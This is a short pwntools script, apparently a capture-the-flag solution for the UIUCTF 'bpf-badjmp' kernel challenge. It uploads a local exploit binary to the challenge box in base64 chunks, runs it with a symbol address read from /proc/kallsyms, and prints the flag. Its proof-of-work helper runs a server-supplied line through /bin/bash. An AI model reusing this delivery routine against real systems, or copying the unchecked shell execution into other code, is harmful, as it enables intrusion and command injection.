from pwn import *
from subprocess import check_output

def solve_pow():
    if "proof-of-work: enabled" not in str(p.recvline(), 'utf-8'):
        return
    print(p.recvline())
    p.recvline()
    cmd = "/bin/bash -c '{}'".format(str(p.recvline(), 'utf-8').strip())
    log.info("Solve {}".format(cmd))
    answer = check_output(cmd, shell=True).strip()
    log.info("Found PoW solution: {}".format(answer))
    p.sendlineafter("Solution? ", answer)

def send_command(cmd, print_cmd = True, print_resp = False):
    if print_cmd:
        log.info(cmd)

    p.sendlineafter("$", cmd)
    resp = p.recvuntil("$")

    if print_resp:
        log.info(resp)

    p.unrecv("$")
    return resp

def send_file(name):
    file = read(name)
    f = b64e(file)


    send_command("touch /tmp/a.gz.b64")
    size = 800
    for i in range(len(f)//size + 1):
        log.info("Sending chunk {}/{}".format(i, len(f)//size))
        send_command("echo -n '{}'>>/tmp/a.gz.b64".format(f[i*size:(i+1)*size]), False)

    send_command("cat /tmp/a.gz.b64 | base64 -d > /tmp/a.gz")
    send_command("gzip -d /tmp/a.gz")
    send_command("chmod +x /tmp/a")
    send_command("mv /tmp/a /tmp/exploit")
    send_command("/tmp/exploit $(cat /proc/kallsyms | grep uiuctf | awk '{print $1}')")
    p.recvuntil("uiuctf{")
    flag = str(p.recvuntil("}", drop=True), "utf-8")
    print("Flag: uiuctf{{{}}}".format(flag))

def exploit():
    send_file("exploit.gz")

if __name__ == "__main__":

    #context.log_level = 'debug'
    #p = remote("your_server", 10101)
    p = remote("bpf-badjmp.chal.uiuc.tf", 1337)
    solve_pow()
    p.newline = b'\r\n'
    exploit()
